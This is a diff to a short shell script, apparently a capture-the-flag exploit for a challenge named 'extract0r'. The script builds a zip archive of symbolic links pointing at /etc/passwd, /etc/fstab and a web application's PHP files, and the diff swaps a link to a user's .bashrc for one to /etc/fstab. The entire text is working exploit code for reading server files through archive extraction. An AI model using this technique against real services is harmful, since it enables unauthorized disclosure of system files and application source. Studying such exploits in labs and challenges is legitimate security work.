@@ -10,10 +10,11 @@ done
 ln -s /etc/passwd passwd
 ln -s ../../index.php index
 ln -s ../../url.php url
-ln -s /home/extract0r/.bashrc extract0r
+#ln -s /home/extract0r/.bashrc extract0r
+ln -s /etc/fstab fstab
 
 # zip stuff
-zip --symlinks cmd.zip testfile.txt passwd index url extract0r
+zip --symlinks cmd.zip testfile.txt passwd index url fstab
 
 # cleanup
-rm passwd index url extract0r testfile.txt
+rm passwd index url fstab testfile.txt
